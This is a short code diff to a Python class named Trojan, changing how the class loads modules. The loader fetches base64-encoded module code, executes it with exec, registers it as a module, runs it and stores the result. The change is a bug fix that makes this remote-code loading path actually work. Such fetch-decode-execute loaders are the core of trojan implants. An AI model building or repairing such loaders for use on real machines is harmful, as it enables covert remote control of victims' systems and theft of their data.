@@ -94,12 +94,14 @@ class Trojan:
                 if module_code:
                     print(f"[*] Module code retrieved successfully for '{module_name}'")
                     exec(base64.b64decode(module_code).decode('utf-8'), globals())
-                    if module_name in sys.modules:
+                    # Manually add the module to sys.modules
+                    if module_name in globals():
+                        sys.modules[module_name] = globals()[module_name]
                         print(f"[*] Module '{module_name}' successfully loaded and running...")
                         result = sys.modules[module_name].run()
                         self.store_module_result(result)
                     else:
-                        print(f"[*] Module '{module_name}' still not found after loading.")
+                        print(f"[*] Module '{module_name}' not found after executing code.")
                 else:
                     print(f"[*] Failed to retrieve module code for '{module_name}'.")
             except Exception as e:
